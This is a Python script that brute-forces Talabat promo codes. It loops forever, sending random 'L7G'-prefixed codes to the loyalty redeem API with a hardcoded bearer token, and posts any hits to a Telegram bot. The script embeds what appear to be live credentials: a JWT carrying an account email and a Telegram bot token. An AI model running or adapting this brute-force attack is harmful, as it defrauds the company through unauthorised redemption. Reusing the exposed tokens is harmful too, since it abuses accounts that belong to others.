import requests
import json
import random
import string
import telebot
####bot spam ###
tok = "7620190655:AAHjHgkGbCBLox7y_7pwxD6Y4tnPCgWptMI"
ch_id = "7037898496"
botA = telebot.TeleBot(token=tok)
def generate_random_code():
    # تثبيت الجزء "L7G"
    fixed_part = "L7G"
    
    # توليد 5 أحرف وأرقام عشوائية
    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))
    
    # دمج الجزء الثابت مع الجزء العشوائي
    return fixed_part + random_part
def t():
    code=generate_random_code()
    url = "https://loyalty.talabat.com/api/v3/me/promo-codes/redeem"
    
    payload = json.dumps({
      "promoCode":code,
      "country": 9
    })
    print(code)
    
    headers = {
      'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
      'Accept-Encoding': "gzip",
      'Content-Type': "application/json",
     # 'x-perseussessionid': "1721863131871.485423224486340084.tPVVBwiBvD",
      #'x-device-version': "11.210",
     # 'x-device-source': "",
      #'x-perseusclientid': "1721863131857.493687602552868028.AdQcj2fDun",
      'authorization': "bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImtleW1ha2VyLXRhbGFiYXQtMDAyNi1hbmRyb2lkIiwidHlwIjoiSldUIn0.eyJpc3MiOiJodHRwczovL3RhbGFiYXQuZGgtYXV0aC5pbyIsInN1YiI6IjQyODc3Mjc2IiwiYXVkIjoiYW5kcm9pZCIsImV4cCI6MTczNzM5NDc0NywiaWF0IjoxNzM3MzUxNTQ3LCJqdGkiOiJhbnI2cWZ1d3ZtZnZreWw1bWw1ZXhpYm53eXNhand1NG1pMWFzZ2U4Iiwic2NvcGUiOiIiLCJtZXRhZGF0YSI6eyJlbWFpbCI6Ind3dy5oYXNhbjY3QGdtYWlsLmNvbSJ9fQ.bYhKae3fxhdOK9kACnNUMVa6wAs37xH1mXRlbtq5G-WlPW-eJTjvQpqKuJHOKs-FpvNPtn6Rcj7GOryuQdehwmgjR2m0XRwbeE5owaY7q1Ew7tPN3CvTujbTp48U1YVHqrwtNXzug6sbP7Z47vq8DmmTXx1UcZTjlAG33_w_yQu2OGH_E5j7FtPTJXY_1Md8y-OMLb_5kp83GbFLsMk4HtCq_1QhqheorkV5ebYS-T0xi5NVGbMmGapIFofaY37o1Df5c5NCo-CF_ZeoYjoTmITbSA7v5MtF9rG5n-Lf1pctkRKkoSetbQrx9WA8hdsVXukCKj02Jpvb2aj2w6IKlw",
      'tokentypekey': "jwt",
      #'appbrand': "1",
      'accept-language': "ar-KW",
      #'x-device-id': "cd2a415e513668a1",
     # 'x-device-framework': "flutter"
    }
    
    response = requests.post(url, data=payload, headers=headers).text
    #print(response)
    if "كود القسيمة هذا غير صحيح،" in response:
        print("BAD")
    elif "هذه الحملة قد وصلت إلى حدها الأقصى"in response:
        print("suspect") 
        botA.send_message(chat_id=ch_id, text=code)
        botA.send_message(chat_id=ch_id, text="suspect")
    elif "الشروط" in response:
         botA.send_message(chat_id=ch_id, text=code)
         botA.send_message(chat_id=ch_id, text="شغاال") 
    elif "ساري" in response:
         botA.send_message(chat_id=ch_id, text=code)
         botA.send_message(chat_id=ch_id, text="شغاال") 
    elif response == "":pass
    else:
        print(response)
        botA.send_message(chat_id=ch_id, text=code)       
while True:
    try:
        t()
    except:pass
